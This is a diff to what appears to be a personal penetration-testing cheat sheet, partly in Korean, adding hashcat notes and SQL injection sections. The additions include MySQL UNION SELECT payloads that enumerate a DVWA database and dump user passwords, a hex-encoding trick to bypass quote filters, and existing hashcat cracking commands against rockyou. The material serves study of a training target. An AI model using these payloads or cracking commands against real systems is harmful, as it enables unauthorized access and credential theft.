@@ -11,7 +11,9 @@
   * [John](#john)
   * [Hashcat](#hashcat)
 * [SQL Injection](#SQL-Injection)
+  * [Examining the database](#examining-the-database)
   * [Error based SQL Injection](#error-based-sql-injection)
+  * [Filter bypass](#filter-bypass)
 
 # Enumeration
 
@@ -102,6 +104,8 @@ hashcat -m 0 "412dd4759978acfcc81deab01b382403" /usr/share/wordlists/rockyou.txt
 hashcat -m 0 hashfile.txt /usr/share/wordlists/rockyou.txt.gz --show
 ~~~
 
+```--show``` 옵션을 붙일 경우 이전에 나왔던 결과를 출력하고 크래킹 작업은 생략
+
 ### Linux password
 
 ~~~ bash
@@ -118,9 +122,27 @@ hashcat -m 1000 -a 0 hash.txt rockyou.txt
 
 # SQL Injection
 
+## Examining the database
+
+~~~ sql
+-- MYSQL
+UNION SELECT TABLE_NAME,TABLE_SCHEMA FROM information_schema.tables WHERE TABLE_SCHEMA = 0x64767761# 0x64767761 = 'dvwa'
+UNION SELECT TABLE_NAME,COLUMN_NAME FROM information_schema.columns WHERE TABLE_NAME = 0x7573657273# 0x7573657273 = 'users'
+UNION SELECT USER, PASSWORD FROM USERS#
+~~~
+
+reference: [https://portswigger.net/web-security/sql-injection/examining-the-database](https://portswigger.net/web-security/sql-injection/examining-the-database)
+
 ## Error Based SQL Injection
 
 ~~~ sql
 -- MSSQL
 if (@@VERSION)=9 select 1 else select 2;
 ~~~
+
+## Filter bypass
+
+Quote bypass: [https://www.rapidtables.com/convert/number/ascii-to-hex.html](https://www.rapidtables.com/convert/number/ascii-to-hex.html)
+
+reference: [https://portswigger.net/support/sql-injection-bypassing-common-filters](https://portswigger.net/support/sql-injection-bypassing-common-filters)
+
